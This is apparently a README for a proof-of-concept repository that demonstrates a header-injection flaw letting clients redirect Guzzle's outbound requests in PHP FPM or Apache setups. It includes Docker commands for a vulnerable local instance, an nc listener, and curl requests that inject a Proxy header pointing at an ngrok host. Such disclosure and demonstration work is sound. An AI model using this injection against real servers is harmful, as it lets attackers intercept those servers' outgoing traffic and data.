# Guzzle FPM Proxy Vulnerability

Some command-line HTTP clients support a set of environment variables to configure a proxy. These
are of the form `<protocol>_PROXY`; `HTTP_PROXY` is particularly noteworthy.

Separately, PHP takes user-supplied headers, and sets them as `HTTP_*` in the `$_SERVER` autoglobal.

## Steps

This is how the vulnerability works:

1. Do the usual PHP thing of exposing user-supplied headers as `$_SERVER['HTTP_*']`
2. Be using Guzzle from FPM or Apache (haven't tested with other SAPIs, assume some others possibly vulnerable too)
3. As an HTTP client, inject a `Proxy: my-malicious-service` header to any request made
4. Watch as Guzzle helpfully sends the request to the malicious proxy, supplied by the client

## Using this repo

Here is how you can see it in action:

1. Clean up running instances from the last run:

    ```sh
    docker stop fpm-test-instance > /dev/null 2>&1
    docker rm   fpm-test-instance > /dev/null 2>&1
    ```

2. Start a new test instance of the vulnerable script:

    ```sh
    docker build -t fpm-guzzle-proxy .
    docker run -d -p 80:80 --name fpm-test-instance fpm-guzzle-proxy
    ```

3. Start some sort of capturing proxy, to test whether the request comes through. Note that things interpreting HTTP_PROXY
    don't seem to care about the path portion of the URL (so, requestb.in won't work). I have had success with `ngrok tcp 9999`,
    but it requires a paid account. Another one that works well for local testing is:

    `nc -l 12345`

4. Then, fire a request at your vulnerable script, and watch the data arrive at the user-specified proxy:

    ```sh
    curl -H 'Proxy: 0.tcp.ngrok.io:12345' 127.0.0.1
    ```

    or

    ```sh
    curl -H 'Proxy: 172.17.0.1:12345' 127.0.0.1
    ```

    etc.


